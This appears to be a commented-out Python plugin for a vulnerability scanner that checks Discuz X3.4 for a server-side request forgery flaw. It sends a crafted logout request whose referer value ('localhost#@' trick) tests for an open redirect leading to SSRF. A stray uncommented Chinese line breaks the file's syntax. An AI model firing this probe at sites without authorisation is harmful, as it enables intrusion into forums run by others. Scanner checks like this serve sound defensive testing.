# #!/usr/bin/env python
# # -*- coding: utf-8 -*-
# # @author: 'orleven'
#
# '''
# version < 41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3
# PHP version > 5.3
# php-curl <= 7.54
# discuz is runing on 80 port
# windows
# https://www.cnblogs.com/iamstudy/articles/discuz_x34_ssrf_1.html
# '''
#
# def info(data):
#     info = {
#         "name": "discuz x3.4 ssrf",
#         "info": "discuz x3.4 ssrf",
#         "level": "high",
#         "type": "ssrf",
#     }
#     return info
#
# def prove(data):
#     init(data,'discuz')
#     if data['base_url']:
#         url = data[
#                   'base_url'] + "code-src/dz/Discuz_TC_BIG5/upload/member.php?mod=logging&action=logout&XDEBUG_SESSION_START=13904&referer=http://localhost%23%40www.baidu.com&quickforward=1"
#  input标签 name=formhash 的value中取
#         res = curl('post', url)
#         if res != None and "location".lower() in res.headers.keys() and 'http://localhost#@www.baidu.com' in res.headers['location']:
#             data['flag'] = 1
#             data['data'].append({"flag": url})
#             data['res'].append({"info": url, "key": "discuz x3.4 ssrf"})
#     return data
#
#
# if __name__=='__main__':
#     from script import init, curl
#     print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))